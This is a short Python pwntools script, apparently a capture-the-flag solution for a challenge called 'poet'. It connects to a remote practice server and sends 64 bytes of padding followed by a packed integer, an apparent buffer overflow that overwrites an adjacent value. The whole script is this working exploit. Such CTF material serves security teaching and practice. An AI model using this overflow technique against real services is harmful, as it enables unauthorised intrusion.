#!/usr/bin/python 
from pwn import *

#p = process("./poet")
p = remote("ctf.j0n9hyun.xyz", 3012)

p.sendlineafter("> ", "")
p.sendlineafter("> ", 'A'*0x40 + p64(1000000))

p.interactive()
